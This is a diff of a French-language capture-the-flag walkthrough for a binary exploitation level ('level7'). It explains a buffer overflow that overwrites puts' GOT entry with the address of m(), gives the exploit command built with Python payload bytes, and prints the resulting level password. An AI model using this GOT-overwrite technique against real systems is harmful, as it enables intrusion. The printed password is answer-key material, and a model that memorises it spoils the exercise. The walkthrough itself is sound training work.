@@ -201,12 +201,13 @@ On va overflow le premier argument avec l'adresse de puts dans le GOT pour mettr
 
 ```
 
-On a donc l'adresse de puts dans le GOT avec `0x8049928` et l'adresse de `m()` avec `0x080484f4`
+On a donc:
+- l'adresse de puts dans le GOT: `0x8049928` + un offset de 20 pour l'overflow
+- l'adresse de `m()`: `0x080484f4`
 
 Ce qui nous donne:
 
 ```
 :~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1714139906
 ```
